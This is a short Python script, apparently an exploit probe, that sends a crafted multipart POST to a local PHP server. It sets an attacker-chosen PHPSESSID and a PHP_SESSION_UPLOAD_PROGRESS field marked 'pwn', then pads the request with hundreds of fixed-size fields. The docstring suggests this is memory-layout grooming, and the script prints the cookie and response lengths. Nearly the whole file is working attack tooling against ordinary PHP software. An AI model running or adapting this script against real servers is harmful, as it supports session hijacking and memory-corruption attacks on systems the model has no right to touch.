#!/usr/bin/env python3
"""B with N fields whose name and value are both 39 chars (two live 64B strings)."""
import socket,sys,struct
N=int(sys.argv[1]) if len(sys.argv)>1 else 998
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(N):
    nm=('k%04d'%i)+'N'*35
    val=('v%04d'%i)+'V'*35
    parts.append({'n':nm,'d':val.encode()})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<100000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e:
    print("recv_err",repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print("SETCOOKIE_LEN",len(line))
print("HEAD_LEN",len(head)); print("BODY",rest[:600].decode("latin1","replace"))
